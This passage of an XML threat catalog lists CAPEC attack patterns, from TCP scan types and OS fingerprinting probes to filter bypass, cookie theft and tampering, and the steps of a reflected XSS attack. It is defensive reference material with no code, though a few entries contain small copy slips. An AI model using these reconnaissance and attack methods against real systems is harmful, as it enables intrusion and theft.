  <description>An attacker uses a TCP SYN packets as a means of purpose of host discovery. Typical RFC 793 behavior specifies that when a TCP port is open, a host must respond to an incoming SYN &quot;synchronize&quot; packet by completing stage two of the 'three-way handshake' by sending an SYN/ACK in response. When a port is closed, RFC 793 behavior is to respond with a RST &quot;reset&quot; packet. This behavior can be used to 'ping' a target to see if it is alive by sending a TCP SYN packet to a port and then looking for a RST or an ACK packet in response. Due to the different responses from open and closed ports, SYN packets can be used to determine the remote state of the port. A TCP SYN ping is also useful for discovering alive hosts protected by a stateful firewall. In cases where a specific firewall rule does not block access to a port, a SYN packet can pass through the firewall to the host and solicit a response from either an open or closed port. When a stateful firewall is present SYN pings are preferable to ACK pings, because a stateful firewall will typically drop all unsolicited ACK packets because they are not part of an existing or new connection. TCP SYN pings often fail when a stateless ACL or firewall is configured to blanket-filter incoming packets to a port. The firewall device will discard any SYN packets to a blocked port. An attacker will often alternate between SYN and ACK pings to discover if a host is alive. A TCP SYN ping has the following characteristics:1. Host Discovery: Can be used to discover if a host is alive via ACK or RST packets.2. Effective Against: Stateful Firewalls that allow incoming new connections to target ports.3. Weak Against: Stateless firewalls that blanket-filter incoming SYN4. Port State: Able to determine port state via SYN/ACK or RST response.</description>
</threat>
<threat label="CAPEC-3" name="Using Leading 'Ghost' Character Sequences to Bypass Input Filters" type="Detailed" reference="CAPEC">
  <description>An attacker intentionally introduces leading characters that enable getting the input past the filters. The API that is being targetted, ignores the leading &quot;ghost&quot; characters, and therefore processes the attacker's input. This occurs when the targetted API will accept input data in several syntactic forms and interpret it in the equivalent semantic way, while the filter does not take into account the full spectrum of the syntactic forms acceptable to the targetted API.Some APIs will strip certain leading characters from a string of parameters. Perhaps these characters are considered redundant, and for this reason they are removed. Another possibility is the parser logic at the beginning of analysis is specialized in some way that causes some characters to be removed. The attacker can specify multiple types of alternative encodings at the beginning of a string as a set of probes.One commonly used possibility involves adding ghost characters—extra characters that don't affect the validity of the request at the API layer. If the attacker has access to the API libraries being targeted, certain attack ideas can be tested directly in advance. Once alternative ghost encodings emerge through testing, the attacker can move from lab-based API testing to testing real-world service implementations.Determine if the source code is available and if so, examine the filter logic.If the source code is not available, write a small program that loops through various possible inputs to given API call and tries a variety of alternate (but equivalent) encodings of strings with leading ghost characters. Knowlege of frameworks and libraries used and what filters they apply will help to make this search more structured.Observe the effects. See if the probes are getting past the filters. Identify a string that is semantically equivalent to that which an attacker wants to pass to the targeted API, but syntactically structured in a way as to get past the input filter. That encoding will contain certain ghost characters that will help it get past the filters. These ghost characters will be ignored by the targeted API.Once the &quot;winning&quot; alternate encoding using (typically leading) ghost characters is identified, an attacker can launch the attacks against the targetted API (e.g. directory traversal attack, arbitrarary shell command execution, corruption of files)Failure in authorization service may lead to compromises in data confidentiality and integrity.</description>
</threat>
<threat label="CAPEC-30" name="Hijacking a Privileged Thread of Execution" type="Standard" reference="CAPEC">
  <description>Attackers can sometimes hijack a privileged thread from the underlying system through synchronous (calling a privileged function that returns incorrectly) or asynchronous (callbacks, signal handlers, and similar) means.Having done so, the Attacker may not only likely access functionality the system's designer didn't intend for them, but they may also go undetected or deny other users essential service in a catastrophic (or insidiously subtle) way.Attacker determines the underlying system thread that is subject to user-controlAttacker then provides input, perhaps by way of environment variables for the process in question, that affect the executing threadUpon successful hijacking, the attacker enjoys elevated privileges, and can possibly have the hijacked thread do his biddingThe attacker may attach a debugger to the executing process and observe the spawning and clean up of threads, as well as the switches in privilege levelsThe attacker can also observe the environment variables, if any, that affect executing threads and modify them in order to observe their effect on the execution.</description>
</threat>
<threat label="CAPEC-300" name="Port Scanning" type="Standard" reference="CAPEC">
  <description>An attacker uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network. Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the attacker information concerning the firewall configuration. Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four types of port status that a port scan usually attempts to discover:1. Open Port: The port is open and a firewall does not block access to the port2. Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port3. Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified4. Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified. For strategic purposes it is useful for an attacker to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is impossible with certain scan types. A TCP connect scan, for instance, cannot distinguish a blocked port with a active service from a closed port that is not firewalled. Other scan types can only detect closed ports, while others cannot detect port state at all, only the presence or absence of filters. Collecting this type of information tells the attacker which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An attacker often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host.</description>
</threat>
<threat label="CAPEC-301" name="TCP Connect Scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses full TCP connection attempts to determine if a port is open. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack. RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. This type of scanning has the following characteristics. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. In terms of port status, TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming. Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports. A TCP Connect scan has the following characteristics:1. Speed: TCP Connect scanning is very slow.2. Stealth: TCP SYN scanning is extremely noisy and involves a significant number of packets.3. Open Port: Detects that a port is open via a successful three-way handshake4. Filtered Port: Cannot distinguish a closed (unfiltered) port from an open (filtered) port.5 .Unfiltered Port: Can detect an unfiltered port only when the unfiltered port is in front of an active TCP/IP service. The TCP Connect scan has the advantage of versatility and ease of use in that it works equally well against all TCP stacks and that it is easy for a novice to interpret the results of the scan due to its all or nothing nature. Its disadvantages are noise, speed, and poor visibility into the filter structure of a firewall. As a general rule, performing a full TCP connect scan against a host can take multiple days.</description>
</threat>
<threat label="CAPEC-302" name="TCP FIN scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses a TCP FIN scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the FIN bit set in the packet header. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. The major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. FIN packets, like out-of-state ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.1. Speed: TCP FIN scanning is fast compared to other types of scans2. Stealth: TCP FIN scanning is stealthy compared to other types of scans3. Open Port: Detects an open port via no response to the segment4. Closed Port: Detects that a closed via a RST received in response to the FIN5. Filtered Port: Cannot distinguish between a filtered port and an open port6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port FIN scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, FIN scanning a system protected by a stateful firewall may indicate all ports being open. For these reasons, FIN scanning results must always be interpreted as part of a larger scanning strategy. FIN scanning is still relatively stealthy as the packets tend to blend in with the background noise on a network link. FIN scans are detected via heuristic (non-signature) based algorithms, much in the same way as other scan types are detected.</description>
</threat>
<threat label="CAPEC-303" name="TCP Xmas Scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses a TCP XMAS scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with the all flags sent in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. he major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. XMAS packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason FIN scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.1. Speed: TCP XMAS scanning is fast compared to other types of scans2. Stealth: TCP XMAS scanning was once stealthy, but is now easily detected by IDS/IPS systems3. Open Port: Detects an open port via no response to the segment4. Closed Port: Detects that a closed via a RST received in response to the FIN5. Filtered Port: Cannot distinguish between a filtered port and an open port6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port XMAS scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, XMAS scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, XMAS scans are flagged by almost all intrusion prevention or intrusion detection systems.</description>
</threat>
<threat label="CAPEC-304" name="TCP Null Scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses a TCP NULL scan to determine if ports are closed on the target machine. This scan type is accomplished by sending TCP segments with no flags in the packet header, generating packets that are illegal based on RFC 793. The RFC 793 expected behavior is that any TCP segment with an out-of-state Flag sent to an open port is discarded, whereas segments with out-of-state flags sent to closed ports should be handled with a RST in response. This behavior should allow an attacker to scan for closed ports by sending certain types of rule-breaking packets (out of sync or disallowed by the TCB) and detect closed ports via RST packets. he major advantage of this scan type is its ability to scan through stateless firewall or ACL filters. Such filters are configured to block access to ports usually by preventing SYN packets, thus stopping any attempt to 'build' a connection. NULL packets, like out-of-state FIN or ACK packets, tend to pass through such devices undetected. Many operating systems, however, do not implement RFC 793 exactly and for this reason NULL scans do not work as expected against these devices. Some operating systems, like Microsoft Windows, send a RST packet in response to any out-of-sync (or malformed) TCP segments received by a listening socket (rather than dropping the packet via RFC 793), thus preventing an attacker from distinguishing between open and closed ports.1. Speed: TCP NULL scanning is fast compared to other types of scans2. Stealth: TCP NULL scanning was once stealthy, but is now easily detected by IDS/IPS systems3. Open Port: Detects an open port via no response to the segment4. Closed Port: Detects that a closed via a RST received in response to the FIN5. Filtered Port: Cannot distinguish between a filtered port and an open port6. Unfiltered Port: Cannot distinguish between an unfiltered port and a non-stateful filtered port NULL scans are limited by the range of platforms against which they work. Additionally, because open ports are inferred via no responses being generated, one cannot distinguish an open port from a filtered port without further analysis. For instance, NULL scanning a system protected by a stateful firewall may indicate all ports being open. Because of their obvious rule-breaking nature, NULL scans are flagged by almost all intrusion prevention or intrusion detection systems.</description>
</threat>
<threat label="CAPEC-305" name="TCP ACK Scan" type="Detailed" reference="CAPEC">
  <description>An attacker uses TCP ACK segments to gather information about firewall or ACL configuration. The purpose of this type of scan is to discover information about filter configurations rather than port state. This type of scanning is rarely useful alone, but when combined with SYN scanning, gives a more complete picture of the type of firewall rules that are present. When a TCP ACK segment is sent to a closed port, or sent out-of-sync to a listening port, the RFC 793 expected behavior is for the device to respond with a RST. Getting RSTs back in response to a ACK scan gives the attacker useful information that can be used to infer the type of firewall present. Stateful firewalls will discard out-of-sync ACK packets, leading to no response. When this occurs the port is marked as filtered. When RSTs are received in response, the ports are marked as unfiltered, as the ACK packets solicited the expected behavior from a port. When combined with SYN techniques an attacker can gain a more complete picture of which types of packets get through to a host and thereby map out its firewall rule-set. ACK scanning, when combined with SYN scanning, also allows the attacker analyze whether a firewall is stateful or non-stateful. If a SYN solicits a SYN/ACK or a RST and an ACK solicits a RST, the port is unfiltered by any firewall type. If a SYN solicits a SYN/ACK, but an ACK generates no response, the port is statefully filtered. When a SYN generates neither a SYN/ACK or a RST, but an ACK generates a RST, the port is statefully filtered. When neither SYN nor ACK generates any response, the port is blocked by a specific firewall rule, which can occur via any type of firewall.1. Speed: TCP ACK scanning is fast compared to other types of scans2. Stealth: TCP ACK scanning is stealthy3. Open Port: Cannot detect open ports4. Closed Port: Cannot detect closed ports5. Filtered Port: Can detect stateful vs non-stateful filters when combined with SYN probes6. Unfiltered Port: Can detect unfiltered ports when combined with SYN probes Interpreting the results of ACK scanning requires rather sophisticated analysis. A skilled attacker may use this method to map out firewall rules, but the results of ACK scanning will be less useful to a novice.</description>
</threat>
<threat label="CAPEC-306" name="TCP Window Scan" type="Detailed" reference="CAPEC">
  <description>An attacker engages in TCP Window scanning to analyze port status and operating system type. TCP Window scanning uses the ACK scanning method but examine the TCP Window Size field of response RST packets to make certain inferences. This scanning method works against fewer TCP stack implementations than any other type of scan. Some operating systems return a positive TCP window size when a RST packet is sent from an open port, and a negative value when the RST originates from a closed port.1. Speed: TCP Window scanning is fast compared to other types of scans2. Stealth: TCP Window scanning is relatively stealthy, much like ACK scanning3. Open Port: Can detect open ports based on Window size for a limited number of operating systems4. Closed Port: Can detect closed ports based on Window size for limited number of operating systems5. Filtered Port: Can identify filtered ports when combined with other methods6. Unfiltered Port: Can identify unfiltered ports when combined with other methods TCP Window scanning is one of the most complex scan types, and its results are difficult to interpret. Window scanning alone rarely yields useful information, but when combined with other types of scanning is more useful. TCP Window scanning is a more reliable means of making inference about operating system versions than port status.</description>
</threat>
<threat label="CAPEC-307" name="TCP RPC Scan" type="Detailed" reference="CAPEC">
  <description>An attacker scan for RPC services listing on a Unix/Linux host. This type of scan can be obtained via native operating system utilities or via port scanners like nmap. When performed by a scanner, an RPC datagram is sent to a list of UDP ports and the response is recorded. Particular types of responses can be indicative of well known RPC services running on a UDP port.1. Speed: Direct RPC scans that bypass portmapper/sunrpc are typically slow compare to other scan types2. Stealth: RPC scanning is not stealthy, as IPS/IDS systems detect RPC queries3. Open Port: Can only detect open ports when an RPC service responds4. Closed Port: Detects closed ports on the basis of ICMP diagnostic messages.5. Filtered Port: Cannot identify filtered ports6. Unfiltered Port: Cannot identify unfiltered ports There are two general approaches to RPC scanning. One is to use a native operating system utility, or script, to query the portmapper/rpcbind application running on port 111. Portmapper will return a list of registered RPC services. Alternately, one can use a port scanner or script to scan for RPC services directly. Discovering RPC services gives the attacker potential targets to attack, as some RPC services are insecure by default.</description>
</threat>
<threat label="CAPEC-308" name="UDP Scan" type="Detailed" reference="CAPEC">
  <description>An attacker engages in UDP scanning to gather information about UDP port status. UDP scanning methods involve sending a UDP datagram to the target port and looking for evidence that the port is closed. Open UDP ports usually do not respond to UDP datagrams as there is no stateful mechanism within the protocol that requires building or establishing a session. Responses to UDP datagrams are therefore application specific and cannot be relied upon as a method of detecting an open port. UDP scanning relies heavily upon ICMP diagnostic messages in order to determine the status of a remote port. Firewalls or ACLs which block egress ICMP error types effectively prevent UDP scans from returning any useful information. UDP scanning is further complicated by rate limiting mechanisms governing ICMP error messages. During a UDP scan, a datagram is sent to a target port. If an ICMP Type 3 Port unreachable error message is returned then the port is considered closed. Different types of ICMP messages can indicate a filtered port.1. Speed: UDP scanning is very slow due to ICMP rate limiting2. Stealth: RPC scanning is relatively stealthy provided the sending rate does not trigger IPS/IDS sensors3. Open Port: Infers an open port based on no response, or an occasional response by a well-known service4. Closed Port: Detects a closed port using return ICMP diagnostic messages from the host5. Filtered Port: Can detect some filtered ports via ICMP diagnostic messages6. Unfiltered Port: Can detect unfiltered ports based on some ICMP diagnostic messages The protocol characteristics of UDP make port scanning inherently more difficult than with TCP, as well as dependent upon ICMP for accurate scanning. Due to ambiguities that can arise between open ports and filtered ports, UDP scanning results often require a high degree of interpretation and further testing to refine. In general, UDP scanning results are less reliable or accurate than TCP-based scanning.</description>
</threat>
<threat label="CAPEC-309" name="Scanning for Devices, Systems, or Routes" type="Meta" reference="CAPEC">
  <description>An attacker engages in scanning activity to find vulnerable network nodes, such as hosts, devices, or routes. Attackers usually perform this type of network reconnaissance during the early stages of attack against an external network. Many types of scanning utilities are typically employed, including ICMP tools, network mappers, port scanners, and route testing utilities such as traceroute.</description>
</threat>
<threat label="CAPEC-31" name="Accessing/Intercepting/Modifying HTTP Cookies" type="Detailed" reference="CAPEC">
  <description>This attack relies on the use of HTTP Cookies to store credentials, state information and other critical data on client systems.The first form of this attack involves accessing HTTP Cookies to mine for potentially sensitive data contained therein.The second form of this attack involves intercepting this data as it is transmitted from client to server. This intercepted information is then used by the attacker to impersonate the remote user/session.The third form is when the cookie's content is modified by the attacker before it is sent back to the server. Here the attacker seeks to convince the target server to operate on this falsified information.The attacker first needs to obtain a copy of the cookie. The attacker may be a legitimate end user wanting to escalate privilege, or could be somebody sniffing on a network to get a copy of HTTP cookies.Obtain cookie from local filesystem (e.g. C:\Documents and Settings\*\Cookies and C:\Documents and Settings\*\Application Data\Mozilla\Firefox\Profiles\*\cookies.txt in Windows)Sniff cookie using a network sniffer such as WiresharkObtain cookie from local memory or filesystem using a utility such as the Firefox Cookie Manager or AnEC Cookie Editor.Steal cookie via a cross-site scripting attack.Guess cookie contents if it contains predictable information.Cookies used in web application.Cookies not used in web application.The attacker may be able to get sensitive information from the cookie. The web application developers may have assumed that cookies are not accessible by end users, and thus, may have put potentially sensitive information in them.If cookie shows any signs of being encoded using a standard scheme such as base64, decode it.Analyze the cookie's contents to determine whether it contains any sensitive information.Cookie only contains a random session ID (e.g. ASPSESSIONID, JSESSIONID, etc.)Cookie contains sensitive information (e.g. &quot;ACCTNO=0234234&quot;, or &quot;DBIP=0xaf112a22&quot; -- database server's IP address).Cookie's contents cannot be deciphered.The attacker may be able to modify or replace cookies to bypass security controls in the application.Modify logical parts of cookie and send it back to server to observe the effects.Modify numeric parts of cookie arithmetically and send it back to server to observe the effects.Modify cookie bitwise and send it back to server to observe the effects.Replace cookie with an older legitimate cookie and send it back to server to observe the effects. This technique would be helpful in cases where the cookie contains a &quot;points balance&quot; for a given user where the points have some value. The user may spend his points and then replace his cookie with an older one to restore his balance.1. Enables attacker to leverage state stored in cookie2. Enables attacker a vector to attack web server and platform</description>
</threat>
<threat label="CAPEC-310" name="Scanning for Vulnerable Software" type="Meta" reference="CAPEC">
  <description>An attacker engages in scanning activity to find vulnerable software versions or types, such as operating system versions or network services. Vulnerable or exploitable network configurations, such as improperly firewalled systems, or misconfigured systems in the DMZ or external network, provide windows of opportunity for an attacker. Common types of vulnerable software include unpatched operating systems or services (e.g FTP, Telnet, SMTP, SNMP) running on open ports that the attacker has identified. Attackers usually begin probing for vulnerable software once the external network has been port scanned and potential targets have been revealed.</description>
</threat>
<threat label="CAPEC-311" name="Fingerprinting Remote Operating Systems" type="Standard" reference="CAPEC">
  <description>An attacker engages in fingerprinting activity to determine the type or version of the operating system of the remote target. Any platform, device, or server that communicates over the network will conform to one or more protocols, commonly TCP/IP and related protocols. Fingerprinting remote operating systems involves taking an &quot;active&quot; or a &quot;passive&quot; approach. Active approaches to fingerprinting involve sending data packets that break the logical or semantic rules of a protocol and observing operating system response to artificial inputs. Passive approaches involve listening to the communication of one or more nodes and identifying the operating system or firmware of the devices involved based on the structure of their messages.</description>
</threat>
<threat label="CAPEC-312" name="Active OS Fingerprinting" type="Standard" reference="CAPEC">
  <description>An attacker engages in activity to detect the operating system or firmware version of a remote target by interrogating a device, server, or platform with a probe designed to solicit behavior that will reveal information about the operating systems or firmware in the environment. Operating System detection is possible because implementations of common protocols (Such as IP or TCP) differ in distinct ways. While the implementation differences are not sufficient to 'break' compatibility with the protocol the differences are detectable because the target will respond in unique ways to specific probing activity that breaks the semantic or logical rules of packet construction for a protocol. Different operating systems will have a unique response to the anomalous input, providing the basis to fingerprint the OS behavior. This type of OS fingerprinting can distinguish between operating system types and versions.</description>
</threat>
<threat label="CAPEC-313" name="Passive OS Fingerprinting" type="Standard" reference="CAPEC">
  <description>An attacker engages in activity to detect the version or type of OS software in a an environment by passively monitoring communication between devices, nodes, or applications. Passive techniques for operating system detection send no actual probes to a target, but monitor network or client-server communication between nodes in order to identify operating systems based on observed behavior as compared to a database of known signatures or values. While passive OS fingerprinting is not usually as reliable as active methods it is more stealthy.</description>
</threat>
<threat label="CAPEC-314" name="IP Fingerprinting Probes" type="Standard" reference="CAPEC">
  <description>An attacker engages in IP-based techniques for the purpose of fingerprinting operating systems on the network. By interrogating a particular IP stack implementation with IP segments that deviate from the ordinary or expected rules of RFC 791, an attacker can construct a fingerprint of unique behaviors for the target operating system. When this set of behaviors is analyzed against a database of known fingerprints, an attacker can make reliable inferences about the operating system type and version.</description>
</threat>
<threat label="CAPEC-315" name="TCP/IP Fingerprinting Probes" type="Standard" reference="CAPEC">
  <description>An attacker engages in TCP stack fingerprinting techniques to determine the type and version of operating systems on the network. TCP Fingerprinting involves manipulating portions of the TCP header or other characteristics in order to elicit a unique and identifiable response from an operating system. This response is compared against a database of known operating system fingerprints and a guess about the operating system type and version is made.</description>
</threat>
<threat label="CAPEC-316" name="ICMP Fingerprinting Probes" type="Standard" reference="CAPEC">
  <description>An attacker engages in ICMP stack fingerprinting techniques to determine the operating system type and version of a remote target. The role of ICMP as an ubiquitous diagnostic messaging protocol means that ICMP fingerprinting techniques are applicable to almost any internet host in a similar manner as TCP. ICMP fingerprinting techniques involve the generation of ICMP messages and analyzing the responses. This method is limited in that most firewalls are configured to block ICMP messages for security reasons, so it is most effective when used on an internal network segment. OS fingerprints using ICMP usually involve multiple different probes as the information returned from any one probe is usually insufficient to support a reliable OS inference.</description>
</threat>
<threat label="CAPEC-317" name="IP ID Sequencing Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis:1. IP 'ID' Sequencing: Analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host.2. Shared IP 'ID' Sequencing: Analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.</description>
</threat>
<threat label="CAPEC-318" name="IP 'ID' Echoed Byte-Order Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'ID' value from the probe packet. An attacker sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on the remote host to observe the manner in which this bit is echoed back in the ICMP error message. The identification field (ID) is typically utilized for reassembling a fragmented packet. Some operating systems or router firmware reverse the bit order of the ID field when echoing the IP Header portion of the original datagram within an ICMP error message.</description>
</threat>
<threat label="CAPEC-319" name="IP (DF) 'Don't Fragment Bit' Echoing Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe tests to determine if the remote host echoes back the IP 'DF' (Don't Fragment) bit in a response packet. An attacker sends a UDP datagram with the DF bit set to a closed port on the remote host to observe whether the 'DF' bit is set in the response packet. Some operating systems will echo the bit in the ICMP error message while others will zero out the bit in the response packet.</description>
</threat>
<threat label="CAPEC-32" name="Embedding Scripts in HTTP Query Strings" type="Detailed" reference="CAPEC">
  <description>A variant of cross-site scripting called &quot;reflected&quot; cross-site scripting, the HTTP Query Strings attack consists of passing a malicious script inside an otherwise valid HTTP request query string. This is of significant concern for sites that rely on dynamic, user-generated content such as bulletin boards, news sites, blogs, and web enabled administration GUIs. The malicious script may steal session data, browse history, probe files, or otherwise execute attacks on the client side. Once the attacker has prepared the malicious HTTP query it is sent to a victim user (perhaps by email, IM, or posted on an online forum), who clicks on a normal looking link that contains a poison query string. This technique can be made more effective through the use of services like http://tinyurl.com/, which makes very small URLs that will redirect to very large, complex ones. The victim will not know what he is really clicking on.Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the links he finds.Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms.Use a browser to manually explore the website and analyze how it is constructed. Many browser's plugins are available to facilitate the analysis or automate the URL discovery.URL parameters are used by the application or the browser (DOM)Using URL rewriting, parameters may be part of the URL path.No parameters appear on the URL. Even though none appear, the web application may still use them if they are provided.Application could use POST variable as GET inside the application. Therefore, looking for POST parameters and adding them to the query string.Applications that have only static pages or that simply present information without accepting input are unlikely to be susceptible.Possibly using an automated tool, an attacker requests variations on the URLs he spidered before. He sends parameters that include variations of payloads. He records all the responses from the server that include unmodified versions of his script.Use a list of XSS probe strings to inject in parameters of known URLs. If possible, the probe strings contain a unique identifier.Use a proxy tool to record results of manual input of XSS probes in known URLs.The output of pages includes some form of a URL parameter. E.g., ?error=&quot;File not Found&quot; becomes &quot;File not Found&quot; in the title of the web page.Input parameters become part of JavaScript, VBScript, or other script in a web page.Nothing is returned to the web page. It may be a stored XSS. The unique identifier from the probe helps to trace the flow of the possible XSS.As the attacker succeeds in exploiting the vulnerability, he can choose to steal user's credentials in order to reuse or to analyze them later on.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately.When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web siteDevelop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities).By manipulating the content, the attacker targets the information that the user would like to get from the website.Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page.Client web browser may be used to steal session data, passwords, cookies, and other tokens.</description>
</threat>
<threat label="CAPEC-320" name="TCP Timestamp Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe examines the remote server's implementation of TCP timestamps. Not all operating systems implement timestamps within the TCP header, but when timestamps are used then this provides the attacker with a means to guess the operating system of the target. The attacker begins by probing any active TCP service in order to get response which contains a TCP timestamp. Different Operating systems update the timestamp value using different intervals. This type of analysis is most accurate when multiple timestamp responses are received and then analyzed. TCP timestamps can be found in the TCP Options field of the TCP header.1. The attacker sends a probe packet to the remote host to identify if timestamps are present.2. If the remote host is using timestamp, the attacker sends several requests and records the timestamp values.3. The attacker analyzes the timestamp values and determines an average increments per second in the timestamps for the target.3. The attacker compares this result to a database of known TCP timestamp increments for a possible match.</description>
</threat>
<threat label="CAPEC-321" name="TCP Sequence Number Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe tests the target system's assignment of TCP sequence numbers. One common way to test TCP Sequence Number generation is to send a probe packet to an open port on the target and then compare the how the Sequence Number generated by the target relates to the Acknowledgement Number in the probe packet. Different operating systems assign Sequence Numbers differently, so a fingerprint of the operating system can be obtained by categorizing the relationship between the acknowledgement number and sequence number as follows:1. The Sequence Number generated by the target is Zero.2. The Sequence Number generated by the target is the same as the acknowledgement number in the probe3. The Sequence Number generated by the target is the acknowledgement number plus one3. The Sequence Number is any other non-zero number.</description>
</threat>
<threat label="CAPEC-322" name="TCP (ISN) Greatest Common Divisor Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe sends a number of TCP SYN packets to an open port of a remote machine. The Initial Sequence Number (ISN) in each of the SYN/ACK response packets is analyzed to determine the smallest number that the target host uses when incrementing sequence numbers. This information can be useful for identifying an operating system because particular operating systems and versions increment sequence numbers using different values. The result of the analysis is then compared against a database of OS behaviors to determine the OS type and/or version.</description>
</threat>
<threat label="CAPEC-323" name="TCP (ISN) Counter Rate Probe" type="Detailed" reference="CAPEC">
  <description>This OS detection probe measures the average rate of initial sequence number increments during a period of time. Sequence numbers are incremented using a time-based algorithm and are susceptible to a timing analysis that can determine the number of increments per unit time. The result of this analysis is then compared against a database of operating systems and versions to determine likely operation system matches.</description>
</threat>
<threat label="CAPEC-324" name="TCP (ISN) Sequence Predictability Probe" type="Detailed" reference="CAPEC">
  <description>This type of operating system probe attempts to determine an estimate for how predictable the sequence number generation algorithm is for a remote host. Statistical techniques, such as standard deviation, can be used to determine how predictable the sequence number generation is for a system. This result can then be compared to a database of operating system behaviors to determine a likely match for operating system and version.</description>
</threat>
<threat label="CAPEC-325" name="TCP Congestion Control Flag (ECN) Probe" type="Detailed" reference="CAPEC">
  <description>This OS fingerprinting probe checks to see if the remote host supports explicit congestion notification (ECN) messaging. ECN messaging was designed to allow routers to notify a remote host when signal congestion problems are occurring. Explicit Congestion Notification messaging is defined by RFC 3168. Different operating systems and versions may or may not implement ECN notifications, or may respond uniquely to particular ECN flag types.</description>
</threat>
<threat label="CAPEC-326" name="TCP Initial Window Size Probe" type="Detailed" reference="CAPEC">
